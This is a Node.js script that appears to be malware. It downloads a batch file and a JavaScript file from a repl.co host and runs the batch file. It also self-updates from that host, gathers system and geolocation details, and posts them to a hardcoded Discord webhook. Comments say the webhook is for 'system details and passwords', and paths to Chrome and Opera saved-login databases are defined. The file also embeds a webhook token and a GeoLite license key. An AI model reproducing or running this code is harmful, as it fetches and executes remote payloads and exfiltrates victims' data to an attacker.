const axios = require("axios");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { execSync } = require("child_process");

// URLs of the files to download and update
const filesToDownload = [
  {
    url: "https://obsidianator-code-1.blueobsidian.repl.co/ss.bat",
    filePath: "./script.bat",
  },
  {
    url: "https://obsidianator-code-1.blueobsidian.repl.co/index.js",
    filePath: "./index.js",
  },
];

// Discord webhook URL to send system details and passwords
const webhookUrl =
  "https://discord.com/api/webhooks/1127570894995333173/BSfIpUz5MxjlxEJN8wkKUeUVjtCYE_6JXNJbIEhW1CL2CN98tonjv5vR9-7ow-rauIvI";

// Path to Chrome passwords file
const passwordsFilePathChrome = path.join(
  os.homedir(),
  "AppData",
  "Local",
  "Google",
  "Chrome",
  "User Data",
  "Login Data"
);

// Path to Opera passwords file
const passwordsFilePathOpera = path.join(
  os.homedir(),
  "AppData",
  "Roaming",
  "Opera Software",
  "Login Data"
);

// Function to download a file and save it to a specific path
async function downloadFile(url, filePath) {
  try {
    const response = await axios.get(url);
    fs.writeFileSync(filePath, response.data);
    console.log(`File downloaded and saved: ${filePath}`);
  } catch (error) {
    console.error(`Error downloading file: ${filePath}`, error.message);
    throw error;
  }
}

// Function to execute a CMD script or JavaScript file
function executeFile(filePath) {
  try {
    // Execute the file using the 'execSync' function
    const output = execSync(filePath).toString();
    console.log("File output:", output);
  } catch (error) {
    console.error("Error executing file:", error);
    throw error;
  }
}

// Function to retrieve system details
async function getSystemDetails() {
  try {
    const ipAddress = await getIPAddress();
    const geoDetails = await getGeoDetails(ipAddress);

    const systemDetails = {
      computerName: os.hostname(),
      totalMemory: os.totalmem(),
      freeMemory: os.freemem(),
      platform: os.platform(),
      architecture: os.arch(),
      release: os.release(),
      ipAddress,
      country: geoDetails.country.names.en,
      location: geoDetails.location.time_zone,
      city: geoDetails.city.names.en,
      provider: geoDetails.traits.autonomous_system_organization,
    };

    return systemDetails;
  } catch (error) {
    console.error("Error retrieving system details:", error.message);
    throw error;
  }
}

// Function to retrieve the IP address
async function getIPAddress() {
  try {
    const response = await axios.get("https://ipapi.blueobsidian.repl.co/api");
    return response.data.ip;
  } catch (error) {
    console.error("Error retrieving IP address:", error.message);
    throw error;
  }
}

// Function to retrieve country and location details based on IP address
// Function to retrieve country and location details based on IP address
async function getGeoDetails() {
  try {
    const accountId = "888018";
    const licenseKey = "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";

    const auth = {
      username: accountId,
      password: licenseKey,
    };

    const response = await axios.get(
      "https://geolite.info/geoip/v2.1/city/me",
      { auth, params: { pretty: true } }
    );

    const { data } = response;
    console.log(data);
    return data;
  } catch (error) {
    console.error("Error retrieving geo details:", error.message);
    throw error;
  }
}

// Function to send system details to Discord webhook
async function sendSystemDetailsToDiscord(details) {
  try {
    const message = `
      System Details:
      \`\`\`
      ${JSON.stringify(details, null, 2)}
      \`\`\`
    `;
    await axios.post(webhookUrl, { content: message });
    console.log("System details sent to Discord webhook.");
  } catch (error) {
    console.error(
      "Error sending system details to Discord webhook:",
      error.message
    );
    throw error;
  }
}

// Function to check for file updates and self-update if necessary
async function checkAndUpdateFiles() {
  try {
    for (const file of filesToDownload) {
      // Check if the file exists
      if (!fs.existsSync(file.filePath)) {
        // File does not exist, download it
        await downloadFile(file.url, file.filePath);
      } else {
        // File exists, compare the current content with the latest version
        const latestContent = await axios.get(file.url);
        const currentContent = fs.readFileSync(file.filePath, "utf8");
        if (currentContent !== latestContent.data) {
          // Save the latest content to the file
          fs.writeFileSync(file.filePath, latestContent.data);
          console.log(`File updated: ${file.filePath}`);
        } else {
          console.log(`File is up to date: ${file.filePath}`);
        }
      }
    }
  } catch (error) {
    console.error("Error checking and updating files:", error.message);
    throw error;
  }
}

// Main function to download files, execute scripts, and send system details
async function runScript() {
  try {
    // Download files and update if necessary
    await checkAndUpdateFiles();

    // Get the absolute path to the script.bat file
    const scriptPath = path.join(__dirname, "./script.bat");

    // Execute the CMD script
    executeFile(scriptPath);

    // Retrieve system details
    const systemDetails = await getSystemDetails();
    console.log("System Details:", systemDetails);

    // Send system details to Discord webhook
    await sendSystemDetailsToDiscord(systemDetails);
  } catch (error) {
    console.error("Error in runScript:", error);
  }
}

// Invoke the main function to start the process
runScript();
